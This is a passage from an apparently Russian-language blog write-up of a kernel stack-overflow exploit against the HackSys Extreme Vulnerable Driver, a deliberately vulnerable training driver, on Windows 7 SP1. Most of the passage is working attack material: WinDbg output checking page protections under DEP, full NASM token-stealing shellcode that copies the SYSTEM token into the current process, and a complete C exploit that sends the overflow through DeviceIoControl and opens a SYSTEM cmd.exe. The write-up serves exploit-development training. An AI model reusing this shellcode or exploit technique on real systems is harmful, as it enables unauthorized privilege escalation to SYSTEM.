    <span class="nx">abeedabc</span>  <span class="mi">00000824</span>
</code></pre></div></div>

<p>Адрес из даты
Бита нету</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pte</span> <span class="mi">004040</span><span class="nx">c0</span>
                    <span class="nx">VA</span> <span class="mi">004040</span><span class="nx">c0</span>
<span class="nx">PDE</span> <span class="nx">at</span> <span class="nx">C0600010</span>            <span class="nx">PTE</span> <span class="nx">at</span> <span class="nx">C0002020</span>
<span class="nx">contains</span> <span class="mi">0000000051</span><span class="nx">BD3867</span>  <span class="nx">contains</span> <span class="mi">8000000051</span><span class="nx">C05025</span>
<span class="nx">pfn</span> <span class="mi">51</span><span class="nx">bd3</span>     <span class="o">---</span><span class="nx">DA</span><span class="o">--</span><span class="nx">UWEV</span>  <span class="nx">pfn</span> <span class="mi">51</span><span class="nx">c05</span>     <span class="o">----</span><span class="nx">A</span><span class="o">--</span><span class="nx">UR</span><span class="o">-</span><span class="nx">V</span>
</code></pre></div></div>

<p>Сидим курим бамбук…</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">t</span>
    <span class="mi">004040</span><span class="nx">c0</span> <span class="mi">60</span>              <span class="nx">pushad</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">t</span>
<span class="nx">Access</span> <span class="nx">violation</span> <span class="o">-</span> <span class="nx">code</span> <span class="nf">c0000005 </span><span class="p">(</span><span class="o">!!!</span> <span class="nx">second</span> <span class="nx">chance</span> <span class="o">!!!</span><span class="p">)</span>
    <span class="mi">004040</span><span class="nx">c0</span> <span class="mi">60</span>              <span class="nx">pushad</span>
</code></pre></div></div>

<h3 id="включен-dep--shellc_ptr"><a href="#header-3"></a>Включен DEP + shellc_ptr</h3>

<p>Куча</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerStackOverflow</span><span class="o">+</span><span class="mh">0xc8</span><span class="p">:</span>
<span class="nx">aa35e6f2</span> <span class="nx">c20800</span>          <span class="nx">ret</span>     <span class="mi">8</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="o">/</span><span class="nx">c1</span> <span class="nx">esp</span> <span class="nx">L3</span>
    <span class="nx">ab163ab4</span>  <span class="mi">002</span><span class="nx">c0000</span>
    <span class="nx">ab163ab8</span>  <span class="mi">0022</span><span class="nx">f680</span>
    <span class="nx">ab163abc</span>  <span class="mi">00000824</span>
</code></pre></div></div>

<p>Исполняемая</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pte</span> <span class="mi">002</span><span class="nx">c0000</span>
                    <span class="nx">VA</span> <span class="mi">002</span><span class="nx">c0000</span>
<span class="nx">PDE</span> <span class="nx">at</span> <span class="nx">C0600008</span>            <span class="nx">PTE</span> <span class="nx">at</span> <span class="nx">C0001600</span>
<span class="nx">contains</span> <span class="mi">0000000058</span><span class="nx">F7E867</span>  <span class="nx">contains</span> <span class="mi">000000005903</span><span class="nx">D867</span>
<span class="nx">pfn</span> <span class="mi">58</span><span class="nx">f7e</span>     <span class="o">---</span><span class="nx">DA</span><span class="o">--</span><span class="nx">UWEV</span>  <span class="nx">pfn</span> <span class="mi">5903</span><span class="nx">d</span>     <span class="o">---</span><span class="nx">DA</span><span class="o">--</span><span class="nx">UWEV</span>
</code></pre></div></div>

<h3 id="код"><a href="#header-3"></a>Код</h3>

<p><strong>shellcode.asm</strong></p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; nasm -f bin shellcode.bin shellcode.asm</span>

<span class="err">[</span><span class="nf">bits</span> <span class="mi">32</span><span class="p">]</span>

<span class="c1">;FS:[0](_KPCR) --&gt; _KPCR+0x120 (PrcbData _KPRCB) --&gt; _KPRCB+0x4 (CurrentThread _KTHREAD) --&gt; _KTHREAD+0x40 (ApcState _KAPC_STATE) --&gt; _KAPC_STATE+0x10 (Process _KPROCESS)</span>
<span class="c1">;_EPROCESS.UniqueProcessId 		_EPROCESS+0xb4</span>
<span class="c1">;_EPROCESS.ActiveProcessLinks		_EPROCESS+0xb8</span>
<span class="c1">;_EPROCESS.Token			_EPROCESS+0xf8</span>

<span class="nf">section</span> <span class="nv">.text</span>
	<span class="no">WIN7_SP1_SYS_PID</span><span class="kd">		equ</span> <span class="mh">004h</span>	<span class="c1">; System PID in Windows 7 SP1 x86</span>
	<span class="no">WIN7_SP1_PID_OFFSET</span><span class="kd">		equ</span> <span class="mh">0B4h</span>	<span class="c1">; nt!_EPROCESS.UniqueProcessId</span>
	<span class="no">WIN7_SP1_TOKEN_OFFSET</span><span class="kd">		equ</span> <span class="mh">0F8h</span>	<span class="c1">; nt!_EPROCESS.Token</span>
	<span class="no">WIN7_SP1_FLINK_OFFSET</span><span class="kd">		equ</span> <span class="mh">0B8h</span>	<span class="c1">; nt!_EPROCESS.ActiveProcessLinks.Flink</span>
	<span class="no">WIN7_SP1_KTHREAD_OFFSET</span><span class="kd">		equ</span> <span class="mh">124h</span>	<span class="c1">; nt!_KPCR.PcrbData.CurrentThread</span>
	<span class="no">WIN7_SP1_EPROCESS_OFFSET</span><span class="kd">	equ</span> <span class="mh">050h</span>	<span class="c1">; nt!_KTHREAD.ApcStateProcess</span>

<span class="nf">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>
	<span class="nf">pushad</span>
	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>						<span class="c1">; Set ZERO</span>
	<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="nb">eax</span> <span class="o">+</span> <span class="nv">WIN7_SP1_KTHREAD_OFFSET</span><span class="p">]</span>		<span class="c1">; Get nt!_KPCR.PcrbData.CurrentThread</span>
								<span class="c1">; _KTHREAD is located at FS:[0x124]</span>
	<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="nv">WIN7_SP1_EPROCESS_OFFSET</span><span class="p">]</span>		<span class="c1">; Get nt!_KTHREAD.ApcState.Process</span>
	<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>						<span class="c1">; Copy current thread's _EPROCESS structure</span>

	<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nv">WIN7_SP1_SYS_PID</span>				<span class="c1">; System PID</span>

	<span class="nl">SearchSystemPID:</span>
		<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="nv">WIN7_SP1_FLINK_OFFSET</span><span class="p">]</span> 		<span class="c1">; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span>
		<span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="nv">WIN7_SP1_FLINK_OFFSET</span>
		<span class="nf">cmp</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="nv">WIN7_SP1_PID_OFFSET</span><span class="p">],</span> <span class="nb">edx</span>		<span class="c1">; Compare nt!_EPROCESS.UniqueProcessId with pid in edx</span>
		<span class="nf">jne</span> <span class="nv">SearchSystemPID</span>

	<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="nv">WIN7_SP1_TOKEN_OFFSET</span><span class="p">]</span>			<span class="c1">; Get System process nt!_EPROCESS.Token</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nv">WIN7_SP1_TOKEN_OFFSET</span><span class="p">],</span> <span class="nb">edx</span>			<span class="c1">; Replace nt!_EPROCESS.Token with System's Token</span>

	<span class="nf">popad</span>

	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>                                            <span class="c1">; Set NTSTATUS SUCCESS</span>
	<span class="nf">pop</span> <span class="nb">ebp</span>
	<span class="nf">ret</span> <span class="mi">8</span>
</code></pre></div></div>

<p><strong>exploit.c</strong></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cp">#define IO_CODE 0x222003
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">kDevName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling CreateFileA() to obtain a handle to driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">kDevName</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span>
    <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error - dailed to get file handle!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Successfully obtained a handle to the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    
	<span class="n">DWORD</span> <span class="n">bytesRetn</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">expl</span><span class="p">[</span><span class="mh">0x824</span><span class="p">];</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">expl</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">expl</span><span class="p">));</span>

	<span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x60\x31\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x89\xC1\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x31\xC0\x5D\xC2\x08\x00</span><span class="s">"</span><span class="p">;</span>

    <span class="n">LPVOID</span> <span class="n">shellc_ptr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">shellc_ptr</span><span class="p">)</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">shellc_ptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="mi">58</span><span class="p">);</span>
    
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">expl</span><span class="p">[</span><span class="mh">0x820</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">shellc_ptr</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">);</span>
    <span class="c1">//memcpy(&amp;expl[0x820], &amp;shellcode, 0x4);</span>

    <span class="c1">//expl[0x820] = ((unsigned char *)(&amp;shellcode))[0];</span>
    <span class="c1">//expl[0x821] = ((unsigned char *)(&amp;shellcode))[1];</span>
    <span class="c1">//expl[0x822] = ((unsigned char *)(&amp;shellcode))[2];</span>
    <span class="c1">//expl[0x823] = ((unsigned char *)(&amp;shellcode))[3];</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Starting interaction with the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IO_CODE</span><span class="p">,</span> <span class="n">expl</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">expl</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesRetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
	
	
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

</article>
      </section>
    </div>
  </div>
</body>

</html>
